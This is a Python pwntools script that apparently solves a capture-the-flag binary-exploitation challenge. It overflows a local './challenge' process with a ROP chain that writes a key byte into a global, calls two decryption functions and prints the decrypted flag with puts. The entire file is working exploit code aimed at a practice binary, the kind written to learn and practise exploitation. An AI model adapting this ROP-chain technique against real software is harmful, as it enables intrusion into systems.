#!/usr/bin/env python3

from pwn import *
from typing import Union


def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
    gadget = ROP(elf).find_gadget(instructions)
    return p64(gadget.address)


elf = ELF("./challenge", checksec=False)
# TODO fin a way to call [] and `call` instructions
gadget_popr14       = get_gadget(elf, ['pop r14', 'ret'])
gadget_popr15       = get_gadget(elf, ['pop r15', 'ret'])
gadget_loadr15inr14 = p64(0x000000000040076a)
gadget_poprdi       = p64(0x0000000000400771)
vulnerablefunc      = p64(elf.symbols.get("read_inp"))
firstpart           = p64(elf.symbols.get("first_part"))
secondpart          = p64(elf.symbols.get("second_part"))
flag_global         = p64(elf.symbols.get("flag"))
key_global          = p64(elf.symbols.get("key"))
call_puts           = p64(0x00000000004008c1)
key_char            = p64(ord('%'))

b = cyclic(40)
c = vulnerablefunc
p = process("./challenge")

# write % to key
gogo = b''
gogo += cyclic(40) + gadget_popr14 + key_global + c        # dest
gogo += cyclic(40) + gadget_popr15 + key_char + c          # src
gogo += cyclic(40) + gadget_loadr15inr14 + c + cyclic(8)   # src to dest

# decrypt files into global
gogo += cyclic(40) + firstpart + c + cyclic(8)
gogo += cyclic(40) + secondpart + c + cyclic(8)

# print global
gogo += cyclic(40) + gadget_poprdi + flag_global + call_puts

p.sendline(gogo)

p.recvuntil("PoC")
log.success("PoC" + p.recvline().decode())
